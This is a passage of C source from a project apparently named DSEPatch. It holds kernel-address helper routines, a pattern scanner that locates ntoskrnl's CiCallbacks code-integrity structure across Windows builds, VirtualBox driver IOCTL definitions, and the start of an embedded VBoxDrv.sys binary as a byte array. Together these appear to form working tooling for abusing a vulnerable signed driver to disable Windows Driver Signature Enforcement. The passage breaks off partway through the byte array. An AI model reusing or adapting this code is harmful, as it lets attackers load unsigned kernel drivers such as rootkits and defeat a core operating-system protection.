    _In_opt_ LPWSTR pwszRootDirectory,
    _In_opt_ HANDLE hRootDirectory,
    _In_ PENUMOBJECTSCALLBACK CallbackProc,
    _In_opt_ PVOID CallbackParam
)
{
    BOOL                cond = TRUE;
    ULONG               ctx, rlen;
    HANDLE              hDirectory = NULL;
    NTSTATUS            status;
    NTSTATUS            CallbackStatus;
    OBJECT_ATTRIBUTES   attr;
    UNICODE_STRING      sname;

    POBJECT_DIRECTORY_INFORMATION    objinf;

    if (CallbackProc == NULL) {
        return STATUS_INVALID_PARAMETER_4;
    }

    status = STATUS_UNSUCCESSFUL;

    __try {

        // We can use root directory.
        if (pwszRootDirectory != NULL) {
            RtlSecureZeroMemory(&sname, sizeof(sname));
            RtlInitUnicodeString(&sname, pwszRootDirectory);
            InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);
            status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);
            if (!NT_SUCCESS(status)) {
                return status;
            }
        }
        else {
            if (hRootDirectory == NULL) {
                return STATUS_INVALID_PARAMETER_2;
            }
            hDirectory = hRootDirectory;
        }

        // Enumerate objects in directory.
        ctx = 0;
        do {

            rlen = 0;
            status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);
            if (status != STATUS_BUFFER_TOO_SMALL)
                break;

            objinf = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, rlen);
            if (objinf == NULL)
                break;

            status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);
            if (!NT_SUCCESS(status)) {
                RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);
                break;
            }

            CallbackStatus = CallbackProc(objinf, CallbackParam);

            RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);

            if (NT_SUCCESS(CallbackStatus)) {
                status = STATUS_SUCCESS;
                break;
            }

        } while (cond);

        if (hDirectory != NULL) {
            NtClose(hDirectory);
        }

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = STATUS_ACCESS_VIOLATION;
    }

    return status;
}

/*
* supIsObjectExists
*
* Purpose:
*
* Return TRUE if the given object exists, FALSE otherwise.
*
*/
BOOL supIsObjectExists(
    _In_ LPWSTR RootDirectory,
    _In_ LPWSTR ObjectName
)
{
    OBJSCANPARAM Param;

    if (ObjectName == NULL) {
        return FALSE;
    }

    Param.Buffer = ObjectName;
    Param.BufferSize = (ULONG)_strlen(ObjectName);

    return NT_SUCCESS(supEnumSystemObjects(RootDirectory, NULL, supDetectObjectCallback, &Param));
}

/*
* supGetModuleBaseByName
*
* Purpose:
*
* Return module base address.
*
*/
ULONG_PTR supGetModuleBaseByName(
    _In_ LPSTR ModuleName
)
{
    ULONG_PTR ReturnAddress = 0;
    ULONG i, k;
    PRTL_PROCESS_MODULES miSpace;

    miSpace = supGetSystemInfo(SystemModuleInformation);
    if (miSpace != NULL) {
        for (i = 0; i < miSpace->NumberOfModules; i++) {
            k = miSpace->Modules[i].OffsetToFileName;
            if (_strcmpi_a(
                (CONST CHAR*)&miSpace->Modules[i].FullPathName[k],
                ModuleName) == 0)
            {
                ReturnAddress = (ULONG_PTR)miSpace->Modules[i].ImageBase;
                break;
            }
        }
        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, miSpace);
    }
    return ReturnAddress;
}

/*
* supGetNtOsBase
*
* Purpose:
*
* Return ntoskrnl base address.
*
*/
ULONG_PTR supGetNtOsBase(
    VOID
)
{
    PRTL_PROCESS_MODULES   miSpace;
    ULONG_PTR              NtOsBase = 0;

    miSpace = supGetSystemInfo(SystemModuleInformation);
    if (miSpace != NULL) {
        NtOsBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, miSpace);
    }
    return NtOsBase;
}

/*
* supIsVBoxInstalled
*
* Purpose:
*
* Check VirtualBox software installation state.
*
*/
BOOL supIsVBoxInstalled(
    VOID
)
{
    BOOL     bPresent = FALSE;
    LRESULT  lRet;
    HKEY     hKey = NULL;

    lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox"),
        0, KEY_READ, &hKey);

    bPresent = (hKey != NULL);

    if (hKey) {
        RegCloseKey(hKey);
    }

    return bPresent;
}

/*
* supLookupImageSectionByName
*
* Purpose:
*
* Lookup section pointer and size for section name.
*
*/
PVOID supLookupImageSectionByName(
    _In_ CHAR* SectionName,
    _In_ ULONG SectionNameLength,
    _In_ PVOID DllBase,
    _Out_ PULONG SectionSize
)
{
    BOOLEAN bFound = FALSE;
    ULONG i;
    PVOID Section;
    IMAGE_NT_HEADERS *NtHeaders = RtlImageNtHeader(DllBase);
    IMAGE_SECTION_HEADER *SectionTableEntry;

    if (SectionSize)
        *SectionSize = 0;

    SectionTableEntry = (PIMAGE_SECTION_HEADER)((PCHAR)NtHeaders +
        sizeof(ULONG) +
        sizeof(IMAGE_FILE_HEADER) +
        NtHeaders->FileHeader.SizeOfOptionalHeader);

    //
    // Locate section.
    //
    i = NtHeaders->FileHeader.NumberOfSections;
    while (i > 0) {

        if (_strncmp_a(
            (CHAR*)SectionTableEntry->Name,
            SectionName,
            SectionNameLength) == 0)
        {
            bFound = TRUE;
            break;
        }

        i -= 1;
        SectionTableEntry += 1;
    }

    //
    // Section not found, abort scan.
    //
    if (!bFound)
        return NULL;

    Section = (PVOID)((ULONG_PTR)DllBase + SectionTableEntry->VirtualAddress);
    if (SectionSize)
        *SectionSize = SectionTableEntry->Misc.VirtualSize;

    return Section;
}

/*
* supFindCiCallbacks
*
* Purpose:
*
* Locate address of ntoskrnl g_CiCallbacks/SeCiCallbacks structure.
*
*/
ULONG_PTR supFindCiCallbacks(
    _In_ ULONG NtBuildNumber,
    _In_ ULONG NtOsSize,
    _In_ ULONG_PTR NtOsBase,
    _In_ HMODULE hNtOs
)
{
    BOOL    bCond = FALSE;

    ULONG_PTR Address = 0, Result = 0;

    PBYTE   Signature = NULL, ptrCode = NULL, MatchingPattern = NULL;
    ULONG   SignatureSize = 0;

    PVOID   SectionBase;
    ULONG   SectionSize = 0, Index;

    LONG    Rel = 0;
    hde64s  hs;

    do {
        //
        // Locate PAGE image section as required variable is always in PAGE.
        //
        SectionBase = supLookupImageSectionByName(
            PAGE_SECTION,
            PAGE_SECTION_LEGNTH,
            (PVOID)hNtOs,
            &SectionSize);

        if ((SectionBase == 0) || (SectionSize == 0))
            break;

        MatchingPattern = SeCiCallbacksMatchingPattern; //default matching pattern

        switch (NtBuildNumber) {

        case 7601:
            Signature = g_CiCallbacksPattern_7601;
            SignatureSize = sizeof(g_CiCallbacksPattern_7601);
            MatchingPattern = g_CiCallbacksMatchingPattern;
            break;

        case 9200:
        case 9600:
            Signature = SeCiCallbacksPattern_9200_9600;
            SignatureSize = sizeof(SeCiCallbacksPattern_9200_9600);
            MatchingPattern = SeCiCallbacksMatchingPattern;
            break;

        case 10240:
        case 10586:
            Signature = SeCiCallbacksPattern_10240_10586;
            SignatureSize = sizeof(SeCiCallbacksPattern_10240_10586);
            MatchingPattern = SeCiCallbacksMatchingPattern;
            break;

        case 14393:
            Signature = SeCiCallbacksPattern_14393;
            SignatureSize = sizeof(SeCiCallbacksPattern_14393);
            MatchingPattern = SeCiCallbacksMatchingPattern;
            break;

        case 15063:
        case 16299:
            Signature = SeCiCallbacksPattern_15063_16299;
            SignatureSize = sizeof(SeCiCallbacksPattern_15063_16299);
            MatchingPattern = SeCiCallbacksMatchingPattern;
            break;

        case 17134:
        case 17763:
            Signature = SeCiCallbacksPattern_17134_17763;
            SignatureSize = sizeof(SeCiCallbacksPattern_17134_17763);
            MatchingPattern = SeCiCallbacksMatchingPattern;
            break;

        default:
            break;
        }

        if ((SignatureSize) && (Signature)) {

            ptrCode = (PBYTE)supFindPattern(
                (PBYTE)SectionBase,
                SectionSize,
                Signature,
                SignatureSize);
        }

        if (ptrCode == NULL)
            break;

        if (NtBuildNumber <= 7601) {

            //
            // Find reference to g_CiCallbacks in code.
            //

            Index = 0; //pattern search include target instruction, do not skip

        }
        else {

            //
            // Find reference to SeCiCallbacks/g_CiCallbacks in code.
            //

            Index = SignatureSize; //skip signature instructions

        }

        do {
            hde64_disasm((void*)(ptrCode + Index), &hs);
            if (hs.flags & F_ERROR)
                break;
            //
            // mov cs:g_CiCallbacks, rax (for Windows 7)
            // lea rcx, SeCiCallbacks (for everything else)
            //
            if (hs.len == 7) {
                if ((ptrCode[Index] == MatchingPattern[0]) &&
                    (ptrCode[Index + 1] == MatchingPattern[1]) &&
                    (ptrCode[Index + 2] == MatchingPattern[2]))
                {
                    Rel = *(PLONG)(ptrCode + Index + 3);
                    break;
                }
            }
            Index += hs.len;

        } while (Index < 64);

        if (Rel == 0)
            break;

        Address = (ULONG_PTR)ptrCode + Index + hs.len + Rel;
        Address = NtOsBase + Address - (ULONG_PTR)hNtOs;

        if (!IN_REGION(Address, NtOsBase, NtOsSize))
            break;

        Result = Address;

    } while (bCond);

    return Result;
}

/*
* supFindPattern
*
* Purpose:
*
* Lookup pattern in buffer.
*
*/
PVOID supFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize
)
{
    PBYTE	p = Buffer;

    if (PatternSize == 0)
        return NULL;
    if (BufferSize < PatternSize)
        return NULL;
    BufferSize -= PatternSize;

    do {
        p = (PBYTE)memchr(p, Pattern[0], BufferSize - (p - Buffer));
        if (p == NULL)
            break;

        if (memcmp(p, Pattern, PatternSize) == 0)
            return p;

        p++;
    } while (BufferSize - (p - Buffer) > 0); //-V555

    return NULL;
}

/*
* supSizeOfProc
*
* Purpose:
*
* Very simplified. Return size of procedure when first ret meet.
* Limit size to 4k.
*
*/
ULONG supSizeOfProc(
    _In_ PBYTE FunctionPtr)
{
    ULONG   c = 0;
    UCHAR  *p;
    hde64s  hs;

    __try {

        do {
            p = FunctionPtr + c;
            hde64_disasm(p, &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == 1) {
                if (*p == 0xC3)
                    return c + 1;
            }
            c += hs.len;

        } while (c < 4096);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return c;
}

/*
* supGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR supGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName
)
{
    ANSI_STRING    cStr;
    ULONG_PTR      pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

```

`source/DSEPatch/DSEPatch/sup.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       SUP.H
*
*  VERSION:     1.00
*
*  DATE:        23 Jan 2019
*
*  Common header file for the program support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

typedef NTSTATUS(NTAPI *PENUMOBJECTSCALLBACK)(POBJECT_DIRECTORY_INFORMATION Entry, PVOID CallbackParam);

typedef struct _OBJSCANPARAM {
    PWSTR Buffer;
    ULONG BufferSize;
} OBJSCANPARAM, *POBJSCANPARAM;

void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t ccdest,
    _In_ const void *src,
    _In_ size_t ccsrc);

PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS InfoClass);

BOOL supBackupVBoxDrv(
    _In_ BOOL bRestore);

DWORD supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize);

BOOL supIsObjectExists(
    _In_ LPWSTR RootDirectory,
    _In_ LPWSTR ObjectName);

ULONG_PTR supGetModuleBaseByName(
    _In_ LPSTR ModuleName);

ULONG_PTR supGetNtOsBase(
    VOID);

BOOL supIsVBoxInstalled(
	VOID);

PVOID supLookupImageSectionByName(
	_In_ CHAR* SectionName,
	_In_ ULONG SectionNameLength,
	_In_ PVOID DllBase,
	_Out_ PULONG SectionSize);

ULONG_PTR supFindCiCallbacks(
	_In_ ULONG NtBuildNumber,
	_In_ ULONG NtOsSize,
	_In_ ULONG_PTR NtOsBase,
	_In_ HMODULE hNtOs);

PVOID supFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize);

ULONG supSizeOfProc(
    _In_ PBYTE FunctionPtr);

ULONG_PTR supGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName);

#define PathFileExists(lpszPath) (GetFileAttributes(lpszPath) != (DWORD)-1)

```

`source/DSEPatch/DSEPatch/vbox.h`:

```h
#include <stdint.h>

typedef void* RTR0PTR;

typedef struct _SUPREQHDR {
    /** Cookie. */
    uint32_t        u32Cookie;
    /** Session cookie. */
    uint32_t        u32SessionCookie;
    /** The size of the input. */
    uint32_t        cbIn;
    /** The size of the output. */
    uint32_t        cbOut;
    /** Flags. See SUPREQHDR_FLAGS_* for details and values. */
    uint32_t        fFlags;
    /** The VBox status code of the operation, out direction only. */
    int32_t         rc;
} SUPREQHDR;

/** SUP_IOCTL_COOKIE. */
typedef struct _SUPCOOKIE {
    /** The header.
     * u32Cookie must be set to SUPCOOKIE_INITIAL_COOKIE.
     * u32SessionCookie should be set to some random value. */
    SUPREQHDR               Hdr;
    union
    {
        struct
        {
            /** Magic word. */
            char            szMagic[16];
            /** The requested interface version number. */
            uint32_t        u32ReqVersion;
            /** The minimum interface version number. */
            uint32_t        u32MinVersion;
        } In;
        struct
        {
            /** Cookie. */
            uint32_t        u32Cookie;
            /** Session cookie. */
            uint32_t        u32SessionCookie;
            /** Interface version for this session. */
            uint32_t        u32SessionVersion;
            /** The actual interface version in the driver. */
            uint32_t        u32DriverVersion;
            /** Number of functions available for the SUP_IOCTL_QUERY_FUNCS request. */
            uint32_t        cFunctions;
            /** Session handle. */
            /*R0PTRTYPE(PSUPDRVSESSION)*/ PVOID   pSession;
        } Out;
    } u;
} SUPCOOKIE, *PSUPCOOKIE;

typedef struct _SUPLDROPEN {
    /** The header. */
    SUPREQHDR               Hdr;
    union
    {
        struct
        {
            /** Size of the image we'll be loading. */
            uint32_t        cbImage;
            /** Image name.
             * This is the NAME of the image, not the file name. It is used
             * to share code with other processes. (Max len is 32 chars!)  */
            char            szName[32];
        } In;
        struct
        {
            /** The base address of the image. */
            RTR0PTR         pvImageBase;
            /** Indicate whether or not the image requires loading. */
            BOOLEAN         fNeedsLoading;
        } Out;
    } u;
} SUPLDROPEN, *PSUPLDROPEN;

typedef enum _SUPLDRLOADEP {
    SUPLDRLOADEP_NOTHING = 0,
    SUPLDRLOADEP_VMMR0,
    SUPLDRLOADEP_SERVICE,
    SUPLDRLOADEP_32BIT_HACK = 0x7fffffff
} SUPLDRLOADEP;

typedef struct _SUPSETVMFORFAST {
    /** The header. */
    SUPREQHDR               Hdr;
    union
    {
        struct
        {
            /** The ring-0 VM handle (pointer). */
            PVOID           pVMR0;
        } In;
    } u;
} SUPSETVMFORFAST, *PSUPSETVMFORFAST;

typedef struct _SUPLDRLOAD
{
    /** The header. */
    SUPREQHDR               Hdr;
    union
    {
        struct
        {
            /** The address of module initialization function. Similar to _DLL_InitTerm(hmod, 0). */
            PVOID pfnModuleInit;
            /** The address of module termination function. Similar to _DLL_InitTerm(hmod, 1). */
            PVOID pfnModuleTerm;
            /** Special entry points. */
            union
            {
                /** SUPLDRLOADEP_VMMR0. */
                struct
                {
                    /** The module handle (i.e. address). */
                    RTR0PTR                 pvVMMR0;
                    /** Address of VMMR0EntryInt function. */
                    RTR0PTR                 pvVMMR0EntryInt;
                    /** Address of VMMR0EntryFast function. */
                    RTR0PTR                 pvVMMR0EntryFast;
                    /** Address of VMMR0EntryEx function. */
                    RTR0PTR                 pvVMMR0EntryEx;
                } VMMR0;
                /** SUPLDRLOADEP_SERVICE. */
                struct
                {
                    /** The service request handler.
                     * (PFNR0SERVICEREQHANDLER isn't defined yet.) */
                    RTR0PTR                 pfnServiceReq;
                    /** Reserved, must be NIL. */
                    RTR0PTR                 apvReserved[3];
                } Service;
            }               EP;
            /** Address. */
            RTR0PTR         pvImageBase;
            /** Entry point type. */
            SUPLDRLOADEP    eEPType;
            /** The offset of the symbol table. */
            uint32_t        offSymbols;
            /** The number of entries in the symbol table. */
            uint32_t        cSymbols;
            /** The offset of the string table. */
            uint32_t        offStrTab;
            /** Size of the string table. */
            uint32_t        cbStrTab;
            /** Size of image (including string and symbol tables). */
            uint32_t        cbImage;
            /** The image data. */
            char            achImage[1];
        } In;
    } u;
} SUPLDRLOAD, *PSUPLDRLOAD;


#define RT_SIZEOFMEMB(type, member) ( sizeof(((type *)(void *)0)->member) )
#define SUPCOOKIE_INITIAL_COOKIE                        0x69726f74 /* 'tori' */
#define SUP_IOCTL_COOKIE_SIZE_IN                        sizeof(SUPREQHDR) + RT_SIZEOFMEMB(SUPCOOKIE, u.In)
#define SUP_IOCTL_COOKIE_SIZE_OUT                       sizeof(SUPREQHDR) + RT_SIZEOFMEMB(SUPCOOKIE, u.Out)

#define SUP_IOCTL_FLAG     128

#define SUP_CTL_CODE_SIZE(Function, Size)      CTL_CODE(FILE_DEVICE_UNKNOWN, (Function) | SUP_IOCTL_FLAG, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define SUP_CTL_CODE_BIG(Function)             CTL_CODE(FILE_DEVICE_UNKNOWN, (Function) | SUP_IOCTL_FLAG, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define SUP_CTL_CODE_FAST(Function)            CTL_CODE(FILE_DEVICE_UNKNOWN, (Function) | SUP_IOCTL_FLAG, METHOD_NEITHER,  FILE_WRITE_ACCESS)
#define SUP_CTL_CODE_NO_SIZE(uIOCtl)           (uIOCtl)

/** The magic value. */
#define SUPREQHDR_FLAGS_MAGIC                           UINT32_C(0x42000042)
/** The default value. Use this when no special stuff is requested. */
#define SUPREQHDR_FLAGS_DEFAULT                         SUPREQHDR_FLAGS_MAGIC
#define VERR_INTERNAL_ERROR                 (-225)
#define SUPCOOKIE_MAGIC                                 "The Magic Word!"
#define SUPDRV_IOC_VERSION                              0x001a0007
/** The request size. */
#define SUP_IOCTL_COOKIE_SIZE                           sizeof(SUPCOOKIE)
/** Negotiate cookie. */
#define SUP_IOCTL_COOKIE                                SUP_CTL_CODE_SIZE(1, SUP_IOCTL_COOKIE_SIZE)

/** There is extra input that needs copying on some platforms. */
#define SUPREQHDR_FLAGS_EXTRA_IN                        UINT32_C(0x00000100)
/** There is extra output that needs copying on some platforms. */
#define SUPREQHDR_FLAGS_EXTRA_OUT                       UINT32_C(0x00000200)

/** @name SUP_IOCTL_SET_VM_FOR_FAST
 * Set the VM handle for doing fast call ioctl calls.
 * @{
 */
#define SUP_IOCTL_SET_VM_FOR_FAST                       SUP_CTL_CODE_SIZE(19, SUP_IOCTL_SET_VM_FOR_FAST_SIZE)
#define SUP_IOCTL_SET_VM_FOR_FAST_SIZE                  sizeof(SUPSETVMFORFAST)
#define SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN               sizeof(SUPSETVMFORFAST)
#define SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT              sizeof(SUPREQHDR)
#define SUP_IOCTL_FAST_DO_NOP							SUP_CTL_CODE_FAST(66)

#define SUP_IOCTL_LDR_OPEN                              SUP_CTL_CODE_SIZE(5, SUP_IOCTL_LDR_OPEN_SIZE)
#define SUP_IOCTL_LDR_OPEN_SIZE                         sizeof(SUPLDROPEN)
#define SUP_IOCTL_LDR_OPEN_SIZE_IN                      sizeof(SUPLDROPEN)
#define SUP_IOCTL_LDR_OPEN_SIZE_OUT                     (sizeof(SUPREQHDR) + RT_SIZEOFMEMB(SUPLDROPEN, u.Out))

#define SUP_IOCTL_LDR_LOAD                              SUP_CTL_CODE_BIG(6)
#define SUP_IOCTL_LDR_LOAD_SIZE(cbImage)                RT_UOFFSETOF(SUPLDRLOAD, u.In.achImage[cbImage])
#define SUP_IOCTL_LDR_LOAD_SIZE_IN(cbImage)             RT_UOFFSETOF(SUPLDRLOAD, u.In.achImage[cbImage])
#define SUP_IOCTL_LDR_LOAD_SIZE_OUT                     sizeof(SUPREQHDR)

 /** @name SUP_IOCTL_LDR_FREE
 * Free an image.
 * @{
 */
#define SUP_IOCTL_LDR_FREE                              SUP_CTL_CODE_SIZE(7, SUP_IOCTL_LDR_FREE_SIZE)
#define SUP_IOCTL_LDR_FREE_SIZE                         sizeof(SUPLDRFREE)
#define SUP_IOCTL_LDR_FREE_SIZE_IN                      sizeof(SUPLDRFREE)
#define SUP_IOCTL_LDR_FREE_SIZE_OUT                     sizeof(SUPREQHDR)

typedef struct _SUPLDRFREE {
    /** The header. */
    SUPREQHDR               Hdr;
    union
    {
        struct
        {
            /** Address. */
            RTR0PTR         pvImageBase;
        } In;
    } u;
} SUPLDRFREE, *PSUPLDRFREE;

```

`source/DSEPatch/DSEPatch/vboxdrv.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       VBOXDRV.H
*
*  VERSION:     1.20
*
*  DATE:        17 Apr 2017
*
*  VBoxDrv.sys body
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#ifndef _VBOXDRV_
#define _VBOXDRV_

unsigned char VBoxDrv[68288] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFA, 0x9B, 0x00, 0x11, 0xBE, 0xFA, 0x6E, 0x42, 0xBE, 0xFA, 0x6E, 0x42, 0xBE, 0xFA, 0x6E, 0x42,
    0xBE, 0xFA, 0x6F, 0x42, 0x8A, 0xFA, 0x6E, 0x42, 0xC8, 0x67, 0x15, 0x42, 0xBD, 0xFA, 0x6E, 0x42,
    0xC8, 0x67, 0x13, 0x42, 0xBC, 0xFA, 0x6E, 0x42, 0x99, 0x3C, 0x00, 0x42, 0xB0, 0xFA, 0x6E, 0x42,
    0xBE, 0xFA, 0x6E, 0x42, 0xBD, 0xFA, 0x6E, 0x42, 0x99, 0x3C, 0x03, 0x42, 0xBF, 0xFA, 0x6E, 0x42,
    0x99, 0x3C, 0x14, 0x42, 0xBF, 0xFA, 0x6E, 0x42, 0x99, 0x3C, 0x16, 0x42, 0xBF, 0xFA, 0x6E, 0x42,
    0x52, 0x69, 0x63, 0x68, 0xBE, 0xFA, 0x6E, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x07, 0x00, 0x8D, 0xB5, 0x40, 0x48, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x08, 0x00, 0xC0, 0x8B, 0x00, 0x00,
    0x20, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x0D, 0x00, 0x00, 0x20, 0x03, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xEF, 0x00, 0x00, 0x20, 0x03, 0x00, 0x00, 0x44, 0xEB, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0xDD, 0x00, 0x00, 0x72, 0x0A, 0x00, 0x00,
    0x80, 0xE7, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xD0, 0x00, 0x00, 0xF0, 0x0C, 0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0xC0, 0x1B, 0x00, 0x00,
    0xC0, 0xED, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00, 0x50, 0x8A, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x88, 0x00, 0x00, 0xA8, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
    0x6E, 0x85, 0x00, 0x00, 0x20, 0x03, 0x00, 0x00, 0x80, 0x85, 0x00, 0x00, 0x20, 0x03, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68,
    0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x58, 0x2A, 0x00, 0x00, 0xA0, 0x88, 0x00, 0x00,
    0x60, 0x2A, 0x00, 0x00, 0xA0, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,
    0x00, 0x1D, 0x00, 0x00, 0x00, 0xB3, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00, 0xB3, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8,
    0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0xF0, 0x0C, 0x00, 0x00, 0x00, 0xD0, 0x00, 0x00,
    0x00, 0x0D, 0x00, 0x00, 0x00, 0xD0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x2E, 0x65, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0x72, 0x0A, 0x00, 0x00, 0x00, 0xDD, 0x00, 0x00, 0x80, 0x0A, 0x00, 0x00, 0x00, 0xDD, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
    0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x38, 0x06, 0x00, 0x00, 0x80, 0xE7, 0x00, 0x00,
